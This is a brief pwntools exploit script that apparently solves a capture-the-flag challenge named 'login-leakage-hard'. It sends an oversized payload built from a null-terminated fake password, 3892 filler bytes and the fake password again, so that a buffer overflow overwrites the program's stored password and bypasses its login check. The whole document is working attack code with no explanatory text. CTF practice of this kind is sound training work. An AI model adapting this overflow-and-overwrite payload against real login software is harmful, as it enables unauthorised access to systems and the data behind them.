from pwn import *

p = process('/challenge/login-leakage-hard')

p.recvuntil('Payload size: ')
p.sendline(b'3910')

fake_password =b'AAAAAAAA\x00'
 
# fake_password (9 bytes) + arbitrary_data (0xf34 bytes) + fake_password (9 bytes)
payload = fake_password + b'a' * 3892 + fake_password

p.recvuntil('Send your payload')

p.send(payload)

p.interactive()
